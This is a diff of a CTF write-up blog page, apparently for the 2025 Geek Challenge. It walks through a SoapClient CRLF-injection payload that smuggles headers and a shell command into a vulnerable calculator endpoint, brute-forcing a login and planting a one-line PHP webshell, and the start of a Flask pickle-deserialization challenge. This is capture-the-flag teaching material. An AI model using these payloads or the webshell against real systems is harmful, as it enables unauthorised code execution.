@@ -314,7 +314,28 @@
         <li><a href="#过滤request用attr打">过滤[,request,用attr打</a></li>
       </ol>
     </li>
-    <li><a href="#ez_ssrf">ez_SSRF</a></li>
+    <li><a href="#ez_ssrf">ez_SSRF</a>
+      <ol>
+        <li><a href="#soapclient之http走私">SoapClient之http走私</a></li>
+      </ol>
+    </li>
+    <li><a href="#secretindrivingschool">SecretInDrivingSchool</a></li>
+    <li><a href="#ez_python">ez_python</a>
+      <ol>
+        <li><a href="#考点pickle反序列化内存马">考点：pickle反序列化+内存马</a></li>
+        <li><a href="#1打新版flask内存马-利用error_handler_spec钩子函数">1.打新版flask内存马-利用error_handler_spec钩子函数</a></li>
+        <li><a href="#2打before_request钩子函数">2.打before_request钩子函数</a></li>
+        <li><a href="#3after_request钩子函数">3.after_request钩子函数</a></li>
+        <li><a href="#4简单记录下新版的flask打ssti内存马">4.简单记录下新版的flask打ssti内存马</a></li>
+      </ol>
+    </li>
+    <li><a href="#ez_js">ez_js</a>
+      <ol>
+        <li><a href="#js污染链http同名参数转换为数组绕过逗号">js污染链+http同名参数转换为数组绕过逗号</a></li>
+      </ol>
+    </li>
+    <li><a href="#php不比java差">PHP不比Java差</a></li>
+    <li><a href="#funnysql">funnySQL</a></li>
   </ol>
 </nav>
         </div>
@@ -383,7 +404,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 10 分钟
+                    阅读时长: 15 分钟
                 </time>
             </div>
         
@@ -1382,6 +1403,828 @@
 </div>
 </div><p>完美！！！</p>
 <h2 id="ez_ssrf">ez_SSRF
+</h2><h3 id="soapclient之http走私">SoapClient之http走私
+</h3><p>主要看<a class="link" href="https://xz.aliyun.com/news/9167"  target="_blank" rel="noopener"
+    >浅入深出谭谈 HTTP 响应拆分（CRLF Injection）攻击（上）-先知社区</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span><span class="o">=</span><span class="s2">&#34;stranger&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$location</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$client</span><span class="o">=</span><span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;location&#34;</span><span class="o">=&gt;</span><span class="nv">$location</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;uri&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hahaha&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;login&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;guest&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;gueeeeest!!!!&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;user_agent&#34;</span><span class="o">=&gt;</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&#34;&#39;s Chrome&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">calculator</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;result&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Please give me a location&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">expression</span><span class="o">=</span><span class="sb">`ls /`</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$admin</span><span class="o">=</span><span class="s2">&#34;aaaaaaaaaaaadmin&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$adminpass</span><span class="o">=</span><span class="s2">&#34;i_want_to_getI00_inMyT3st&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$admin</span><span class="p">,</span><span class="nv">$adminpass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;Basic &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$auth</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$auth</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">list</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$auth</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$username</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="nv">$admin</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span><span class="o">===</span><span class="nv">$adminpass</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Hacker&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$expression</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;expression&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$auth</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_AUTHORIZATION&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$auth</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">check</span><span class="p">(</span><span class="nv">$auth</span><span class="p">)</span><span class="o">===</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[0-9+\-*\/]+$/&#39;</span><span class="p">,</span> <span class="nv">$expression</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Invalid expression&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$result</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$expression</span><span class="s2">;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;result&#34;</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$expression</span><span class="s2">;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;result&#34;</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Hacker&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析源码，发现在SoapClient中user可以进行http走私，这里location 决定了 SoapClient 发送请求的目标地址，很明显这里是发到calculator.php。那user怎么走私？看文章的代码我们也来简单构造一下，代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://101.200.39.193:4000/aaa&#39;</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;user_agent&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">AUTHORIZATION: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><span class="se">\r\n</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">Content-Length: 17</span><span class="se">\r\n\r\n</span><span class="s2">expression=`ls /`&#34;</span><span class="p">,</span> <span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//看代码，要加一个AUTHORIZATION头，内容是用户名密码的base编码，然后就是Content-Type与Length覆盖原本的Type与Length，然后再两个\r\n\r\n就可以进行post传参rce了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998.png"
+	width="1836"
+	height="494"
+	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_2f7938b089388131.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624002047998_hu_cb43f5a5fd700a62.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250624002047998"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="891px"
+	
+></p>
+<p>非常好。</p>
+<p>那就打payload，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注意:
+</span></span><span class="line"><span class="cl">\r\n（回车与换行)要url编码为%0d%0a。
+</span></span><span class="line"><span class="cl">然后就是这命令是在本地打的命令，所以$_SERVER[&#39;REMOTE_ADDR&#39;]==&#34;127.0.0.1&#34;（即请求来源IP是127.0.0.1。
+</span></span><span class="line"><span class="cl">然后就是Content-Length要等于body长度。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/h4d333333.php?location=http://127.0.0.1/calculator.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">user</span><span class="o">=%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aAUTHORIZATION</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aContent</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aContent</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">22</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aexpression</span><span class="o">=</span><span class="err">`</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span><span class="err">`</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736.png"
+	width="1390"
+	height="486"
+	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_6ffd620fc8480431.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624003037736_hu_d3b67b7f861e79b6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250624003037736"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="686px"
+	
+></p>
+<p>最后访问result就行。</p>
+<p>[CRLF Injection漏洞的利用与实例分析 - phith0n](<a class="link" href="https://wooyun.js.org/drops/CRLF"  target="_blank" rel="noopener"
+    >https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p>
+<h2 id="secretindrivingschool">SecretInDrivingSchool
+</h2><p>f12发现登入页面，然后爆破得到密码SYC@chengxing（这里没说字母是大写还是小写，那就先爆小写再爆大写，一般不可能大小写混合一起爆）</p>
+<p>然后就是简单的绕过waf进行命令执行了</p>
+<img src="image-20250624143511207.png" alt="image-20250624143511207" style="zoom:50%;" />
+<img src="image-20250624143521125.png" alt="image-20250624143521125" style="zoom:50%;" />
+<p>为什么这个命令回显在首页？？首先这个代码里面的内容是不是和首页的有点像？？？说明这个php可能包含在首页，我们可以写一个马进去看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assert($_REQUEST[1])	
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250624144406225.png" alt="image-20250624144406225" style="zoom:50%;" />
+<p><img src="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006.png"
+	width="415"
+	height="185"
+	srcset="/p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_5b1f4db9be8ee95d.png 480w, /p/2025-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20250624144457006_hu_4d973610f940f2d3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250624144457006"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="538px"
+	
+></p>
+<p>看看index.php发现果然是这样，我们的马就在这ad.php里面</p>
+<img src="image-20250624144433113.png" alt="image-20250624144433113" style="zoom:50%;" />
+<h2 id="ez_python">ez_python
+</h2><h3 id="考点pickle反序列化内存马">考点：pickle反序列化+内存马
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secrets</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">black</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;templates/index.html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">usname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">passwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">usname</span> <span class="ow">and</span> <span class="n">passwd</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">heart_cookie</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Registered successfully with username: </span><span class="si">{</span><span class="n">usname</span><span class="si">}</span><span class="s2"> &lt;br&gt; Now you can go to /login to heal starven&#39;s heart&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;heart&#39;</span><span class="p">,</span> <span class="n">heart_cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heart_cookie</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;heart&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">heart_cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;warning.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;heart&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">heart_cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">statement</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;statement&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">heal_state</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">statement</span><span class="p">)</span>
